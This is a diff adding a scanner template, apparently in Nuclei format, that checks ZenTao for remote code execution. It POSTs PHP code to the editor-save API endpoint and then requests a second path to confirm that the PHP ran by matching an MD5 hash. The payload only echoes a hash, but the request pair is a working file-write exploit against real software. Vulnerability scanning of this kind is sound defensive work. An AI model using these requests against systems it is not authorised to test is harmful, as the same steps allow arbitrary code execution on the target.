@@ -1,0 +1,40 @@
+id: poc-yaml-zentao-editor-save-rce
+info:
+  name: ZenTao API Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - id: "post-rce"
+    method: POST
+    path:
+      - "{{BaseURL}}/api-getModel-editor-save-filePath=1111"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "fileContent=<?php echo md5({{t1}}); ?>"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"status\":\"fail\""
+          - "\"md5\""
+  - id: "get-rce-verification"
+    method: GET
+    path:
+      - "{{BaseURL}}/api-getModel-api-getMethod-filePath=1111/1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
